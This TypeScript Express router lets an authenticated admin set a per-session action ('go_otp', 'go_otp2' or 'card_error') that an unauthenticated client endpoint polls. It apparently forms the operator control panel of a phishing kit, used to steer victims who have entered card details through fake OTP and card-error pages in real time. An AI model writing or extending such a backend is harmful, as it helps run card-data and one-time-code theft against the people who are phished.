import { Router, type IRouter } from "express";
import { setControl, getControl, getControlAsync, setSupabaseConfig, type ControlAction } from "../lib/control-store";
import { extractToken, validateToken } from "../lib/auth";

const router: IRouter = Router();

// Initialize Supabase config from environment
if (process.env.VITE_SUPABASE_URL && process.env.VITE_SUPABASE_ANON_KEY) {
  setSupabaseConfig(process.env.VITE_SUPABASE_URL, process.env.VITE_SUPABASE_ANON_KEY);
}

function requireAuth(
  req: import("express").Request,
  res: import("express").Response,
  next: import("express").NextFunction,
): void {
  const token = extractToken(req.headers.authorization);
  if (!token || !validateToken(token)) {
    res.status(401).json({ error: "Unauthorized" });
    return;
  }
  next();
}

router.get("/control/:sessionId", async (req, res): Promise<void> => {
  const raw = req.params.sessionId;
  const sessionId = Array.isArray(raw) ? raw[0] : raw;
  
  // First check in-memory store (sync)
  const action = getControl(sessionId);
  if (action) {
    res.json({ action });
    return;
  }
  
  // If not in memory, check Supabase (async)
  const supabaseAction = await getControlAsync(sessionId);
  if (supabaseAction) {
    res.json({ action: supabaseAction });
    return;
  }
  
  res.json({ action: null });
});

router.post("/admin/control/:sessionId", requireAuth, (req, res): void => {
  const rawSessionId = req.params.sessionId;
  const sessionId = Array.isArray(rawSessionId) ? rawSessionId[0] : rawSessionId;
  const { action } = req.body as { action?: string };

  const allowed: ControlAction[] = ["go_otp", "go_otp2", "card_error"];
  if (!action || !allowed.includes(action as ControlAction)) {
    res.status(400).json({ error: "Invalid action. Must be: go_otp | go_otp2 | card_error" });
    return;
  }

  setControl(sessionId, action as ControlAction);
  res.json({ success: true, sessionId, action });
});

export default router;
